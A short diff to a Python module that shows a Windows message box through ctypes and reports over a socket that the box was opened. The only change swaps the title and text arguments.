@@ -30,5 +30,5 @@ class messagebox:
     def main(self,args):
         Box = ctypes.windll.user32.MessageBoxA
         sock.sock.s.send("Box was opened\n")
-        Box(None,"Message",args, 0)
+        Box(None,args,"Message", 0)
         return "Message box was closed\n"
